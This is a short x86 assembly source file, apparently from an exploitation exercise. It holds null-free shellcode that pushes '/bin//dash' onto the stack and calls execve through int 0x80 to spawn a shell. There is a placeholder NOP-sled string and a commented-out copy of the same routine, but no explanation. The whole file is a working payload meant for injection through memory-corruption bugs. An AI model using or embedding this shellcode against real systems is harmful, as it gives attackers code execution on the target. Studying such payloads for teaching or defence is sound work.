section .text
    global _start

_start:
    xor eax, eax; safe null
    push eax; push null byte onto stack
    push 0x6873     ; /bin//dash
    push 0x61642f2f
    push 0x6e69622f
    mov ebx,esp ; set ebx to out cmd
    mov ecx, eax; no args
    mov edx, eax ; no args again
    mov al, 0xb ; set sys_execve
    int 0x80


; SHELLCODE: "\x90\x90\x90..."

;global _start
;_start:
    ;----------------------------------
    ; SHELLCODE: "\x90\x90\x90..."

    ;xor eax, eax
;    push eax
;    push 0x6873         ;/bin/dash
;    push 0x61642f2f
;    push 0x6e69622f
;    mov ebx,esp         ;file to execute 
;    mov ecx, eax        ;command line parameters
;    mov edx, eax        ;environments
;    mov al, 0xb         ;opcode execve 11
;    int 0x80            ;invoke
